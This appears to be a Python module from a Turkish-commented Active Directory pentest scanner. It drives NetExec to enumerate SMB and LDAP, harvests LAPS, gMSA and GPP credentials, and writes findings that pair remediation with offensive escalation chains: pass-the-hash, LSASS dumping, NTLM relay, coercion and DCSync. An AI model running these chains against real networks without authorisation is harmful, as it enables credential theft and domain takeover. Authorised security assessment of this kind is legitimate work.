"""NetExec (nxc / crackmapexec) ile SMB ve LDAP enumerasyonu.

Kimlik bilgisi verilmezse null/anonim oturum denenir. Kimlik verilirse
kerberoasting / AS-REP roasting / parola politikası / paylaşımlar çekilir.
"""

from __future__ import annotations

import re

from .. import config
from ..findings import Credential, Finding, ScanReport, Severity
from ..runner import CommandResult, ToolStatus, resolve_tool, run, strip_dryrun
from ..util import grep as _grep
from ..util import loot_path as _loot_path
from ..util import positive_vuln_line as _pos_vuln

# nxc smb info satırı:  ... (name:DC01) (domain:corp.local) (signing:True) ...
_DOMAIN_RX = re.compile(r"\(name:([^)]+)\)\s*\(domain:([^)]+)\)", re.IGNORECASE)
# RID brute satırı:  1104: CORP\svc_sql (SidTypeUser)
_RID_RX = re.compile(r"^\s*\d+:\s*[^\\]+\\([^\s()]+)\s*\(SidTypeUser\)", re.MULTILINE)


def _detect_domain(combined: str, report: ScanReport) -> None:
    """nxc smb info satırından DC adı + domain'i çıkarır ve rapora yazar."""
    m = _DOMAIN_RX.search(combined)
    if not m:
        return
    name, dom = m.group(1).strip(), m.group(2).strip()
    # Domain alanı bazen workgroup/bilgisayar adı olur; nokta içeren = gerçek AD domain
    if not report.dc_name and name:
        report.dc_name = name
    if "." in dom and not report.domain:
        report.domain = dom


def _parse_rid_brute(text: str, report: ScanReport) -> list[str]:
    """RID brute çıktısından (SidTypeUser) kullanıcı adlarını çıkarır."""
    users: list[str] = []
    seen = set()
    for u in _RID_RX.findall(text):
        if u.endswith("$"):
            continue  # makine hesabı
        low = u.lower()
        if low not in seen:
            seen.add(low)
            users.append(u)
            if u not in report.users:
                report.users.append(u)
    return users


def _parse_gmsa(results: list[CommandResult], report: ScanReport) -> None:
    """nxc ldap --gmsa çıktısından okunabilir gMSA parolalarını kimliğe çevirir."""
    gmsa_out = strip_dryrun(next(
        (r.combined for r in results if r.tool.endswith("ldap-gmsa")), ""))
    if not gmsa_out:
        return
    # Tipik: "Account: svc_gmsa$   NTLM: <32hex>"  (nxc gMSA NT hash verir)
    pairs = re.findall(r"Account:\s*(\S+?)\$?\s+NTLM:\s*([0-9a-fA-F]{32})", gmsa_out)
    for acct, nthash in pairs:
        report.add_credential(Credential(
            username=f"{acct}$" if not acct.endswith("$") else acct,
            secret=nthash.lower(), kind="nthash", domain=report.domain,
            source="gmsa", host=report.target))
    if pairs:
        if config.REDACT:
            ev = "\n".join(f"{a}$ : (NT hash gizlendi)" for a, _ in pairs)
        else:
            ev = "\n".join(f"{a}$ : {h.lower()}" for a, h in pairs)
        report.add(Finding(
            title=f"gMSA parolaları okunabiliyor ({len(pairs)} hesap) — nxc",
            severity=Severity.CRITICAL, target=report.target, source="nxc-ldap",
            description="Bu hesap gMSA ManagedPassword özniteliğini okuyabiliyor; servis "
                        "hesaplarının NT hash'leri ele geçirildi (pass-the-hash).",
            evidence=ev,
            remediation="gMSA okuma yetkisini (PrincipalsAllowedToRetrieveManagedPassword) "
                        "yalnızca gereken host'lara verin.",
            reference="gMSA ReadGMSAPassword",
            poc=f"nxc ldap {report.target} -u <user> -p <pass> --gmsa",
            escalation="gMSA NT hash ile pass-the-hash: --reuse -H <hash>; servis hesabı "
                       "yüksek yetkiliyse (SPN/DA) doğrudan yanal hareket/DCSync."))


# nxc ldap satır düzeni: "LDAP  host  389  DC  <5. alan>"  (status satırları [..] ile başlar)
_LDAP_ROW_RX = re.compile(r"^LDAP\s+\S+\s+\d+\s+\S+\s+(?!\[)(\S+)", re.MULTILINE)
_LDAP_NOISE = {"-username-", "username", "-name-", "name", "total", "error",
               "guest", "krbtgt"}


def _extract_ldap_names(text: str) -> list[str]:
    """nxc ldap --users çıktısından kullanıcı adlarını çıkarır (status/başlık eler)."""
    names: list[str] = []
    seen: set[str] = set()
    for tok in _LDAP_ROW_RX.findall(text):
        t = tok.strip()
        low = t.lower()
        if (not t or t.startswith("-") or t.endswith("$") or low in _LDAP_NOISE
                or not re.match(r"^[A-Za-z0-9._-]+$", t)):
            continue
        if low not in seen:
            seen.add(low)
            names.append(t)
    return names


# Yüksek değerli AD grupları -> ele geçirildiğinde ne sağlar (privesc açıklaması)
_PRIV_GROUPS = [
    (r"Enterprise Admins", "Enterprise Admins",
     "forest genelinde tam yetki (tüm domainler)"),
    (r"Domain Admins", "Domain Admins",
     "domain üzerinde tam yetki -> DCSync / krbtgt"),
    (r"Schema Admins", "Schema Admins",
     "AD şemasını değiştir -> kalıcı arka kapı"),
    (r"\bAdministrators\b", "Administrators (Built-in)",
     "DC'de yerel admin -> SYSTEM / DCSync"),
    (r"Backup Operators", "Backup Operators",
     "SeBackup/SeRestore -> NTDS.dit & SAM oku -> DCSync eşdeğeri"),
    (r"Server Operators", "Server Operators",
     "DC'de servisleri yönet -> SYSTEM olarak kod çalıştır"),
    (r"Account Operators", "Account Operators",
     "korumasız hesap/grupları değiştir -> yeni admin oluştur"),
    (r"Print Operators", "Print Operators",
     "DC'ye lokal logon + sürücü yükle -> SYSTEM"),
    (r"DnsAdmins", "DnsAdmins",
     "DNS servisine DLL yüklet (DC'de SYSTEM) -> DC ele geçir"),
    (r"Group Policy Creator", "Group Policy Creator Owners",
     "GPO oluştur/bağla -> OU'lara kod it"),
    (r"Key Admins|Enterprise Key Admins", "Key Admins",
     "msDS-KeyCredentialLink yaz -> Shadow Credentials"),
    (r"Cert Publishers", "Cert Publishers",
     "ADCS/CA yayınına etki -> sertifika suistimali"),
]


def _parse_ldap_enum(results: list[CommandResult], report: ScanReport) -> None:
    """LDAP --users / --groups çıktısını genel enumerasyon bulgusuna çevirir."""
    target = report.target
    users_out = strip_dryrun(next(
        (r.combined for r in results if r.tool.endswith("ldap-users")), ""))
    groups_out = strip_dryrun(next(
        (r.combined for r in results if r.tool.endswith("ldap-groups")), ""))

    users = _extract_ldap_names(users_out)
    # Kimlikli LDAP bind yapıldıysa (çıktı geldiyse) görünen kullanıcı sayısını
    # kaydet — SAMR sayısıyla kıyaslayıp confidential/gizleme ACL'ini yakalamak için.
    if users_out.strip():
        report.ldap_user_count = len(users)
    for u in users:
        if u not in report.users:
            report.users.append(u)
    if users:
        report.add(Finding(
            title=f"LDAP ile {len(users)} kullanıcı enumere edildi — nxc",
            severity=Severity.INFO, target=target, source="nxc-ldap",
            description="Kimlikli LDAP bind başarılı; domain kullanıcıları listelendi.",
            evidence="\n".join(users[:40]),
            poc=f"nxc ldap {target} -u <user> -p <pass> -d <domain> --users",
            escalation="Kullanıcı listesi -> password spraying (--spray) ve AS-REP roasting girdisi."))

    grp_rows = [ln for ln in groups_out.splitlines()
                if re.match(r"^LDAP\s+\S+\s+\d+\s+\S+\s+(?!\[)\S", ln)]
    if grp_rows:
        present = [(name, impl) for pat, name, impl in _PRIV_GROUPS
                   if re.search(pat, groups_out, re.IGNORECASE)]
        priv = bool(present)
        if priv:
            esc = ("Yüksek değerli gruplar tespit edildi — ne sağlayabilir:\n"
                   + "\n".join(f"  • {n}: {impl}" for n, impl in present)
                   + "\nÜyeleri çek: 'windapsearch --da' / '-PU' ya da "
                     "'nxc ldap ... -M group-mem -o GROUP=\"<grup>\"'.\n"
                     "Sonra: üyeleri password spray / kerberoast / AS-REP ile hedefle "
                     "-> yanal hareket -> admin host'ta secretsdump -> DC'de DCSync (DA).")
        else:
            esc = ("Ayrıcalıklı grup görülmedi; yine de üyelikleri "
                   "'nxc ldap ... -M group-mem' ile doğrula.")
        report.add(Finding(
            title=f"LDAP ile {len(grp_rows)} grup enumere edildi — nxc"
                  + (f" ({len(present)} ayrıcalıklı grup — privesc hedefi)" if priv else ""),
            severity=Severity.MEDIUM if priv else Severity.INFO,
            target=target, source="nxc-ldap",
            description=("Ayrıcalıklı AD grupları, üyeleri ele geçirildiğinde doğrudan "
                         "domain ele geçirmeye götürür; üyeleri birincil hedef yap."
                         if priv else "Domain grupları listelendi."),
            evidence=(_grep(groups_out, r"Admins|Operators|Domain Controllers|DnsAdmins|"
                                        r"Key Admins|Group Policy|Cert Publishers", context=0)
                      or "\n".join(grp_rows[:30])),
            poc=f"nxc ldap {target} -u <user> -p <pass> -d <domain> --groups",
            escalation=esc))


def _check_ldap_auth(results: list[CommandResult], combined: str,
                     report: ScanReport) -> None:
    """LDAP bind başarısızsa KULLANICIYA NEDENİNİ söyler (en sık: eksik -d domain)."""
    info = strip_dryrun(next(
        (r.combined for r in results if r.tool.endswith("ldap-info")), "")) or combined
    fail = re.search(r"STATUS_LOGON_FAILURE|STATUS_ACCOUNT_RESTRICTION|KDC_ERR|"
                     r"invalid credentials|STATUS_NOT_SUPPORTED|STATUS_ACCESS_DENIED",
                     info, re.IGNORECASE)
    if fail and "[+]" not in info:
        report.add_error(
            "nxc-ldap: kimlik doğrulama başarısız görünüyor — kullanıcı/parolayı ve "
            "ÖZELLİKLE -d <domain> değerini kontrol edin (LDAP/Kerberos domain ister).")
        report.add(Finding(
            title="LDAP kimlik doğrulaması başarısız — nxc (muhtemelen eksik -d domain)",
            severity=Severity.INFO, target=report.target, source="nxc-ldap",
            description="nxc LDAP bind başarısız göründü; bu yüzden kullanıcı/grup çekilemedi. "
                        "En sık neden: domain verilmemesi ya da yanlış olması.",
            evidence=_grep(info, r"STATUS_|KDC_ERR|credentials", context=0),
            remediation="",
            poc=f"nxc ldap {report.target} -u <user> -p <pass> -d <corp.local>",
            escalation="Domain'i FQDN ver (-d corp.local). Kerberos gerekiyorsa: -k ve DC FQDN'i "
                       "/etc/hosts'a ekle; saat farkını (clock skew < 5 dk) kontrol et "
                       "(ntpdate <dc>)."))


# description alanında parola sızıntısı sinyalleri (TR + EN)
_PW_HINT_RX = re.compile(
    r"\b(pass(word|wort)?|pwd|parola|[sş]ifre|cred(ential)?s?|login|"
    r"default\s*pw|init(ial)?\s*pass|set\s*to)\b",
    re.IGNORECASE)


def _parse_admin_count(results: list[CommandResult], report: ScanReport) -> None:
    """nxc ldap --admin-count: adminCount=1 (ayrıcalıklı / adminSDHolder) hesaplar.

    Bu hesaplar DA/korumalı grup üyeliğinden gelir; öncelikli kerberoast/spray
    hedefleridir. Grup üyeliği kaldırılsa bile adminCount=1 kalabilir (bayat
    adminSDHolder artığı) — temizlik gerektirir. FP guard: yalnızca gerçek LDAP
    veri satırları; banner/olumsuz satırlar elenir.
    """
    out = strip_dryrun(next(
        (r.combined for r in results if r.tool.endswith("ldap-admincount")), ""))
    if not out:
        return
    names = _extract_ldap_names(out)
    # makine hesaplarını zaten _extract_ldap_names eliyor; krbtgt/guest de gürültüde
    if not names:
        return
    report.add(Finding(
        title=f"adminCount=1 ayrıcalıklı hesap(lar) ({len(names)}) — nxc",
        severity=Severity.MEDIUM, target=report.target, source="nxc-ldap",
        description="adminCount=1 işaretli hesaplar korumalı (Domain/Enterprise Admins, "
                    "Backup/Server/Account Operators vb.) gruplardan gelir. Öncelikli "
                    "kerberoast/spray hedefidir; ayrıca grup üyeliği kaldırılmış olsa bile "
                    "işaret kalabilir (bayat adminSDHolder artığı).",
        evidence="\n".join(names[:25]),
        remediation="Gereksiz ayrıcalıkları kaldırın; bayat adminCount=1/adminSDHolder "
                    "ACL artıklarını temizleyin; korumalı hesapları Protected Users'a alın.",
        reference="adminSDHolder / adminCount",
        poc=f"nxc ldap {report.target} -u <user> -p <pass> --admin-count",
        escalation="Bu hesaplar yüksek-değerli: önce kerberoast/AS-REP dene "
                   f"('adscan {report.target} --crack'); kırılırsa çoğu zaman doğrudan DA.",
        mitre="T1078"))


def _parse_user_descriptions(results: list[CommandResult], report: ScanReport) -> None:
    """nxc ldap -M get-desc-users: 'description' alanına yazılmış parolaları yakalar.

    Çok yaygın gerçek-dünya bulgusu ("Password set to Welcome1"). FP guard:
    yalnızca bir parola-ipucu kelimesi İÇEREN ve olumsuz/banner OLMAYAN satırlar.
    """
    out = strip_dryrun(next(
        (r.combined for r in results if r.tool.endswith("ldap-desc")), ""))
    if not out:
        return
    hits: list[str] = []
    for ln in out.splitlines():
        s = ln.strip()
        if not s or _is_negative_line(s):
            continue
        # yalnızca gerçek description taşıyan veri satırları + parola ipucu
        if "description" not in s.lower() and "desc:" not in s.lower():
            continue
        if _PW_HINT_RX.search(s):
            hits.append(s)
    if not hits:
        return
    report.add(Finding(
        title=f"Kullanıcı 'description' alanında olası parola ({len(hits)}) — nxc",
        severity=Severity.HIGH, target=report.target, source="nxc-ldap",
        description="Bir veya daha fazla hesabın AD 'description' alanı parola benzeri "
                    "içerik taşıyor. Bu alan tüm kimlikli kullanıcılarca okunabilir; "
                    "yazılmış parolalar doğrudan kimliğe dönüşebilir.",
        evidence="\n".join(hits[:25]),
        remediation="description/info alanlarından parolaları kaldırın; sızan parolaları "
                    "derhal döndürün (rotate).",
        reference="Credentials in AD Description",
        poc=f"nxc ldap {report.target} -u <user> -p <pass> -M get-desc-users",
        escalation=f"Görünen parolayı doğrudan dene: 'adscan {report.target} --reuse "
                   "-u <hesap> -p <parola>' -> başarılıysa yanal hareket/privesc.",
        mitre="T1552.001"))


def _parse_spooler(results: list[CommandResult], report: ScanReport) -> None:
    """nxc smb -M spooler: Print Spooler (MS-RPRN) açık mı? PrinterBug coercion primitifi.

    FP guard: yalnızca 'enabled'/'running'/'open' gibi POZİTİF sinyal; 'disabled'/
    'not'/'closed' ya da banner satırları raporlanmaz.
    """
    out = strip_dryrun(next(
        (r.combined for r in results if r.tool.endswith("smb-spooler")), ""))
    if not out:
        return
    hits: list[str] = []
    for ln in out.splitlines():
        low = ln.lower()
        if "spooler" not in low:
            continue
        if _is_negative_line(ln):
            continue
        # pozitif sinyal + olumsuzlama değil ("spooler service is disabled/not running" ele)
        if re.search(r"disabl|not\s+(running|enabl|open)|closed|stopped", low):
            continue
        if re.search(r"enabl|running|open|\bup\b|active", low):
            hits.append(ln.strip())
    if not hits:
        return
    report.add(Finding(
        title="Print Spooler açık (PrinterBug/MS-RPRN) — nxc",
        severity=Severity.MEDIUM, target=report.target, source="nxc-smb",
        description="Hedefte Print Spooler servisi çalışıyor. MS-RPRN (PrinterBug) ile "
                    "bu host (DC ise kritik) bir dinleyiciye kimlik doğrulamaya zorlanabilir "
                    "(coercion) — yakalanan auth NTLM relay / unconstrained delegation "
                    "zincirine beslenir.",
        evidence="\n".join(hits[:10]),
        remediation="Gerekmiyorsa DC'lerde ve sunucularda Print Spooler servisini kapatın; "
                    "RPC filtreleri ve SMB/LDAP imzalamayı zorunlu kılın.",
        reference="PrinterBug (MS-RPRN) / Coercion",
        poc=f"nxc smb {report.target} -M spooler",
        escalation="Coerce + relay zinciri: 'adscan --active-attacks --launch' (ntlmrelayx "
                   "+ printerbug). Unconstrained delegation host'una zorlarsan DC TGT -> DCSync.",
        mitre="T1187"))


def _parse_ntlmv1(results: list[CommandResult], report: ScanReport) -> None:
    """nxc smb -M ntlmv1: NTLMv1/LM kimlik doğrulaması izinli mi? (LmCompatibilityLevel)

    NTLMv1 ele geçen auth'lar (DES tabanlı) kolayca NT hash'e kırılır (crack.sh) ve
    downgrade/relay'e açıktır. FP guard: yalnızca POZİTİF ('allowed/enabled/True'),
    olumsuz ('not allowed/disabled/False') ve banner satırları raporlanmaz.
    """
    out = strip_dryrun(next(
        (r.combined for r in results if r.tool.endswith("smb-ntlmv1")), ""))
    if not out:
        return
    hits: list[str] = []
    for ln in out.splitlines():
        low = ln.lower()
        if "ntlmv1" not in low and "lmcompatibility" not in low:
            continue
        if _is_negative_line(ln):
            continue
        # olumsuzu ele: "ntlmv1 not allowed", "...: False", "disabled"
        if re.search(r"not\s+allow|disabl|:\s*false|=\s*false|\bfalse\b", low):
            continue
        if re.search(r"allow|enabl|:\s*true|=\s*true|\btrue\b|downgrade", low):
            hits.append(ln.strip())
    if not hits:
        return
    report.add(Finding(
        title="NTLMv1 / LM kimlik doğrulaması izinli — nxc",
        severity=Severity.HIGH, target=report.target, source="nxc-smb",
        description="Host, NTLMv1 (ve olası LM) kimlik doğrulamasına izin veriyor "
                    "(LmCompatibilityLevel ≤ 2). NTLMv1 yanıtları DES tabanlıdır; yakalanan "
                    "bir auth hızlıca NT hash'e kırılabilir (crack.sh) ve relay/downgrade "
                    "saldırılarına açıktır.",
        evidence="\n".join(hits[:10]),
        remediation="LmCompatibilityLevel'ı 5'e çekin (yalnız NTLMv2); LM & NTLMv1'i GPO ile "
                    "reddedin ('Network security: LAN Manager authentication level').",
        reference="NTLMv1 / LM downgrade",
        poc=f"nxc smb {report.target} -u <user> -p <pass> -M ntlmv1",
        escalation="Coerce/responder ile NTLMv1 yakala -> crack.sh ile NT hash'e kır "
                   "-> pass-the-hash; ya da SMB/LDAP relay (imzalama kapalıysa).",
        mitre="T1557.001"))


def _parse_webdav(results: list[CommandResult], report: ScanReport) -> None:
    """nxc smb -M webdav: WebClient (WebDAV) servisi çalışıyor mu? HTTP coercion primitifi."""
    out = strip_dryrun(next(
        (r.combined for r in results if r.tool.endswith("smb-webdav")), ""))
    if not out:
        return
    hits = []
    for ln in out.splitlines():
        low = ln.lower()
        if "webdav" not in low and "webclient" not in low:
            continue
        if _is_negative_line(ln) or re.search(r"not\s+running|disabl|:\s*false|\bfalse\b", low):
            continue
        if re.search(r"running|enabl|:\s*true|\btrue\b|found", low):
            hits.append(ln.strip())
    if not hits:
        return
    report.add(Finding(
        title="WebDAV (WebClient) çalışıyor — HTTP coercion/relay — nxc",
        severity=Severity.MEDIUM, target=report.target, source="nxc-smb",
        description="Hedefte WebClient (WebDAV) servisi aktif. Bu host, HTTP üzerinden bir "
                    "dinleyiciye kimlik doğrulamaya zorlanabilir; makine hesabı NTLM auth'u "
                    "LDAP(S)/ADCS'ye relay edilerek RBCD veya ESC8'e dönüştürülebilir.",
        evidence="\n".join(hits[:10]),
        remediation="Gerekmiyorsa WebClient servisini kapatın; LDAP/SMB imzalama + EPA zorunlu kılın.",
        reference="WebDAV Coercion (ESC8/RBCD)",
        poc=f"nxc smb {report.target} -u <user> -p <pass> -M webdav",
        escalation="Coerce (PetitPotam/printerbug HTTP) -> ntlmrelayx ile http->ldaps relay "
                   "(RBCD) ya da http->ADCS (ESC8): 'adscan --active-attacks --launch'.",
        mitre="T1187"))


def _parse_gpp_autologin(results: list[CommandResult], report: ScanReport) -> None:
    """nxc smb -M gpp_autologin: SYSVOL Registry.xml içindeki autologon kimlikleri."""
    out = strip_dryrun(next(
        (r.combined for r in results if r.tool.endswith("smb-gpp-autologin")), ""))
    if not out:
        return
    # nxc satırı tipik: "... Found credentials ... Usernames: [admin] Passwords: [P@ss]"
    found = []
    for ln in out.splitlines():
        if _is_negative_line(ln):
            continue
        m = re.search(r"user(?:name)?s?:\s*\[?([^\]\n]+?)\]?\s+pass(?:word)?s?:\s*\[?([^\]\n]+?)\]?\s*$",
                      ln, re.IGNORECASE)
        if m:
            user = m.group(1).strip().strip("'\"")
            pw = m.group(2).strip().strip("'\"")
            if user and pw and pw.lower() not in ("none", "null", ""):
                found.append((user, pw))
                report.add_credential(Credential(
                    username=user, secret=pw, kind="password",
                    domain=report.domain or "", source="gpp-autologin"))
    if not found:
        return
    report.add(Finding(
        title=f"GPP autologin kimlikleri ({len(found)}) — SYSVOL Registry.xml — nxc",
        severity=Severity.HIGH, target=report.target, source="nxc-smb",
        description="SYSVOL'deki Group Policy Registry.xml dosyalarında autologon (varsayılan "
                    "oturum) kullanıcı adı/parolası açık metin bulundu. Tüm kimlikli "
                    "kullanıcılarca okunabilir; doğrudan kullanılabilir kimliklerdir.",
        evidence="\n".join(f"{u}:{config.REDACT and '<gizli>' or p}" for u, p in found[:25]),
        remediation="Registry.xml autologon parolalarını kaldırın; etkilenen hesapları döndürün.",
        reference="GPP Autologin (SYSVOL)",
        poc=f"nxc smb {report.target} -u <user> -p <pass> -M gpp_autologin",
        escalation=f"Kimliği doğrudan dene: 'adscan {report.target} --reuse -u <user> -p <pass>'.",
        mitre="T1552.006"))


def _parse_spider(results: list[CommandResult], report: ScanReport) -> None:
    """nxc smb -M spider_plus: paylaşım içeriğinde hassas dosya/gizli-dize avı (--full)."""
    out = strip_dryrun(next(
        (r.combined for r in results if r.tool.endswith("smb-spider")), ""))
    if not out:
        return
    # İlgi çekici dosya adları/uzantıları (parola/konfig/anahtar/yedek)
    rx = re.compile(
        r"unattend\.xml|sysprep\.(?:xml|inf)|web\.config|\.kdbx|\.key|id_rsa|"
        r"\.ppk|\.pem|\.pfx|\.p12|vnc\.ini|\.keepass|password|passwd|creds?|"
        r"secret|\.bak|\.vmdk|\.ps1|\.config|\.ini|\.ovpn|\.rdp|npmrc|\.git-credentials",
        re.IGNORECASE)
    hits = []
    seen = set()
    for ln in out.splitlines():
        if _is_negative_line(ln) or not rx.search(ln):
            continue
        s = ln.strip()
        if s not in seen:
            seen.add(s)
            hits.append(s)
    if not hits:
        return
    report.add(Finding(
        title=f"Paylaşımlarda hassas dosya(lar) ({len(hits)}) — spider_plus — nxc",
        severity=Severity.MEDIUM, target=report.target, source="nxc-smb",
        description="Erişilebilir SMB paylaşımlarında parola/konfig/anahtar/yedek türünde "
                    "ilgi çekici dosyalar bulundu. Bunlar sık sık açık metin kimlik veya "
                    "özel anahtar barındırır (quick win).",
        evidence="\n".join(hits[:40]),
        remediation="Paylaşımlardan hassas dosyaları kaldırın; paylaşım ACL'lerini sıkılaştırın.",
        reference="Sensitive Files on Shares",
        poc=f"nxc smb {report.target} -u <user> -p <pass> -M spider_plus",
        escalation="Dosyaları indir/incele (unattend.xml/web.config -> açık parola; .kdbx -> "
                   "keepass2john+hashcat; id_rsa/.ppk -> SSH). Çıkan kimlikle --reuse.",
        mitre="T1552.001"))


def _parse_laps(results: list[CommandResult], report: ScanReport) -> None:
    """nxc -M laps çıktısından okunabilir LAPS parolalarını kimliğe çevirir."""
    laps_out = strip_dryrun(next(
        (r.combined for r in results if r.tool.endswith("smb-laps")), ""))
    if not laps_out:
        return
    # Tipik: "LAPS  host  COMPUTER$  <parola>"  ya da  "Computer: X Password: Y"
    # Windows LAPS (v2, msLAPS-Password) netexec'te "Host: … Password: …" basar;
    # eski LAPS (ms-Mcs-AdmPwd) "Computer: …". İkisini de yakala.
    found = re.findall(r"(?:(?:Computer|Host):\s*(\S+).*?Password:\s*(\S+))"
                       r"|(?:\bLAPS\b.*?\s(\S+\$)\s+(\S+)\s*$)",
                       laps_out, re.IGNORECASE | re.MULTILINE)
    creds = []
    for a_comp, a_pw, b_comp, b_pw in found:
        comp = (a_comp or b_comp or "").rstrip("$")
        pw = a_pw or b_pw
        if comp and pw and pw not in ("Password:", "LAPS"):
            creds.append((comp, pw))
            report.add_credential(Credential(
                username=f"{comp}$", secret=pw, kind="password",
                domain=report.domain, source="laps", host=report.target, admin=True))
    if creds:
        if config.REDACT:
            ev = "\n".join(f"{c}  (LAPS parolası gizlendi)" for c, _ in creds)
        else:
            ev = "\n".join(f"{c}$ : {pw}" for c, pw in creds)
        report.add(Finding(
            title=f"LAPS parolaları okunabiliyor ({len(creds)} host) — yerel admin",
            severity=Severity.CRITICAL, target=report.target, source="nxc-smb",
            description="Bu hesap LAPS ms-Mcs-AdmPwd özniteliğini okuyabiliyor; ilgili "
                        "host'larda yerel admin parolası ele geçirildi.",
            evidence=ev,
            remediation="LAPS okuma ACL'lerini en aza indirin; gereksiz delegasyonları kaldırın.",
            reference="LAPS ms-Mcs-AdmPwd",
            poc=f"nxc smb {report.target} -u <user> -p <pass> -M laps",
            escalation="Bu yerel admin parolalarıyla --reuse: host'larda oturum -> secretsdump "
                       "-> domain hash'leri; DC ise DCSync (krbtgt)."))

# nxc bazı sistemlerde 'netexec', eskiden 'crackmapexec'
NXC_CANDIDATES = ["nxc", "netexec", "crackmapexec", "cme"]


def tool() -> ToolStatus:
    return resolve_tool(NXC_CANDIDATES)


def _creds_args(username: str | None, password: str | None, nthash: str | None,
                domain: str | None = None, use_kerberos: bool = False) -> list[str]:
    args: list[str] = []
    if username is not None:
        args += ["-u", username]
    else:
        args += ["-u", ""]  # anonim
    if nthash:
        args += ["-H", nthash]
    elif password is not None:
        args += ["-p", password]
    else:
        args += ["-p", ""]
    # Domain: özellikle LDAP/Kerberos (kerberoast, asreproast, bind) için GEREKLİ.
    # Anonim bind'de (username yok) domain anlamsız.
    if domain and username:
        args += ["-d", domain]
    if use_kerberos:
        args += ["-k"]  # Kerberos auth (ccache/FQDN gerektirir)
    return args


# ---------------------------------------------------------------------------
# SMB
# ---------------------------------------------------------------------------

def smb_scan(
    target: str,
    *,
    username: str | None = None,
    password: str | None = None,
    nthash: str | None = None,
    domain: str | None = None,
    timeout: int = 300,
    dry_run: bool = False,
    use_kerberos: bool = False,
    full: bool = False,
) -> list[CommandResult]:
    from .. import capabilities as _cap
    status = tool()
    bin_name = status.name
    base = [bin_name, "smb", target] + _creds_args(
        username, password, nthash, domain, use_kerberos)

    runs = [
        ("smb-info", base),
        ("smb-shares", base + ["--shares"]),
        ("smb-passpol", base + ["--pass-pol"]),
        ("smb-users", base + ["--users"]),
        # RID brute: null/guest ile bile domain kullanıcılarını çıkarır (spray girdisi)
        ("smb-rid-brute", base + ["--rid-brute", "4000"]),
    ]
    # Print Spooler (MS-RPRN): açıksa PrinterBug ile DC auth-coercion -> relay primitifi.
    # Kimlik gerektirmez; relay/coerce zincirine (--active-attacks) doğrudan besler.
    runs.append(("smb-spooler", base + ["-M", "spooler"]))
    # WebDAV istemcisi çalışıyorsa: HTTP coercion -> ESC8/relay (spooler'ın ikizi).
    if _cap.nxc_has_module("webdav"):
        runs.append(("smb-webdav", base + ["-M", "webdav"]))
    # LAPS: kimlik varken yerel admin parolaları okunabiliyorsa doğrudan erişim
    if username and (password is not None or nthash or use_kerberos):
        runs.append(("smb-laps", base + ["-M", "laps"]))
        # NTLMv1 / LM izinli mi? (LmCompatibilityLevel) — relay + crackable auth
        runs.append(("smb-ntlmv1", base + ["-M", "ntlmv1"]))
        # GPP autologin: SYSVOL'deki Registry.xml -> autologon kimlikleri (cpassword'ı tamamlar)
        if _cap.nxc_has_module("gpp_autologin"):
            runs.append(("smb-gpp-autologin", base + ["-M", "gpp_autologin"]))
        # User hunting: oturum açmış kullanıcılar + aktif oturumlar (hedefli lateral)
        runs.append(("smb-loggedon", base + ["--loggedon-users"]))
        runs.append(("smb-sessions", base + ["--sessions"]))
        # Paylaşım içeriği tarama (AĞIR/gürültülü): yalnızca --full'de.
        # Hassas dosya/gizli-dize avı; OPSEC nedeniyle varsayılan kapalı.
        if full and _cap.nxc_has_module("spider_plus"):
            runs.append(("smb-spider", base + ["-M", "spider_plus",
                                               "-o", "READ_ONLY=true"]))

    results = []
    for label, argv in runs:
        results.append(run(argv, tool=f"nxc:{label}", timeout=timeout, dry_run=dry_run))
    return results


def _parse_user_hunting(results: list[CommandResult], report: ScanReport) -> None:
    """--loggedon-users / --sessions çıktısından host -> oturum kullanıcıları eşler.

    Ayrıcalıklı bir kullanıcının HANGİ host'ta aktif olduğunu bilmek, hedefli yanal
    hareket (o host'u ele geçir -> o kimliği token/hash olarak çal) için kritiktir.
    """
    host_users: dict[str, set[str]] = {}
    for r in results:
        if not (r.tool.endswith("smb-loggedon") or r.tool.endswith("smb-sessions")):
            continue
        cur_host: str | None = None
        for line in strip_dryrun(r.combined).splitlines():
            hm = re.match(r"^\s*(?:SMB|WINRM)\s+(\S+)\s+\d+\s+(\S+)", line)
            if hm:
                cur_host = hm.group(1)
            # Kimlik-doğrulama echo satırını atla ("[+] dom\\user:secret (Pwn3d!)")
            if "[+]" in line and re.search(r"\\\S+:", line):
                continue
            if not cur_host:
                continue
            for _dom, usr in re.findall(r"([A-Za-z0-9.\-]+)\\([A-Za-z0-9._\-]+)", line):
                host_users.setdefault(cur_host, set()).add(usr)
            for usr in re.findall(r"user[:=]\s*([A-Za-z0-9._\-]+)", line, re.IGNORECASE):
                if usr.lower() not in ("none", "null", ""):
                    host_users.setdefault(cur_host, set()).add(usr)

    # Gürültü/başlık kelimelerini ele
    noise = {"enumerated", "loggedon", "sessions", "users", "logon", "server"}
    for h in list(host_users):
        host_users[h] = {u for u in host_users[h] if u.lower() not in noise}
        if not host_users[h]:
            del host_users[h]
    if not host_users:
        return

    # Korelasyon (tiering ihlali) için yapısal olarak sakla
    for h, us in host_users.items():
        report.sessions.setdefault(h, [])
        for u in sorted(us):
            if u not in report.sessions[h]:
                report.sessions[h].append(u)

    total = sum(len(v) for v in host_users.values())
    admins = sorted({u for us in host_users.values() for u in us
                     if re.search(r"adm|svc|sql|backup|service", u, re.IGNORECASE)})
    sev = Severity.HIGH if admins else Severity.MEDIUM
    ev = "\n".join(f"{h}: {', '.join(sorted(us))}" for h, us in sorted(host_users.items()))
    hot = f" (ilgi çekici: {', '.join(admins[:6])})" if admins else ""
    report.add(Finding(
        title=f"User hunting: {total} oturum/kullanıcı {len(host_users)} host'ta{hot}",
        severity=sev, target=report.target, source="nxc-smb",
        description="Uzak host'larda oturum açmış kullanıcılar / aktif SMB oturumları. "
                    "Ayrıcalıklı bir kullanıcının aktif olduğu host ele geçirilirse o kimlik "
                    "(token/hash/ticket) çalınarak doğrudan o yetkiye geçilir.",
        evidence=ev,
        remediation="Ayrıcalıklı hesapların iş istasyonlarında oturum açmasını engelleyin "
                    "(tiered admin / PAW); kullanılmayan oturumları kapatın; LSASS korumasını açın.",
        reference="User Hunting (loggedon-users / sessions)", mitre="T1033",
        poc=f"nxc smb {report.target} -u <user> -p <pass> --loggedon-users   # ve --sessions",
        escalation=(
            "1) Hedef seç: ayrıcalıklı kullanıcının aktif olduğu host\n"
            "2) O host'ta yerel admin ol (reuse/Pwn3d): adscan <host> --reuse\n"
            "3) Belleği/token'ı al: nxc smb <host> -u .. -p .. -M lsassy  (ya da secretsdump)\n"
            "4) Çalınan DA/servis kimliğiyle DCSync -> Domain Admin")))


